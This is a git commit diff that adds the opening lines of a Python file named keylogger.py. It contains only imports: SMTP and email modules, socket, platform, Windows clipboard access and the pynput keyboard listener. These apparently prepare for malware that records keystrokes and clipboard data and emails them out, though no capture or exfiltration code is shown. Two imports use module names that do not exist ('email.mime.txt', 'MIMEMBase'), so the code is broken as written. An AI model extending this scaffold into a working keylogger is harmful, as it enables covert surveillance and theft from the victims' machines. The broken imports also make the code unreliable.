654fb516143965a3855bed6d440d185c53023be1
Legi0n17 <1617.sid@gmail.com>
2024-03-07 13:59:56 +0530

    First-Commit: include basic imports and libraries

---
+++ Keylogger/keylogger.py
@@ -0,0 +1,19 @@
+#Libraries 
+
+from email.mime.multipart import MIMEMultipart
+from email.mime.txt import MIMEText
+from email.mime.base import MIMEMBase
+from email import encoders
+import smtplib
+
+import socket
+import platform
+
+import win32clipboard
+
+from pynput.keyboard import Key,Listener
+
+import time
+import os
+
+
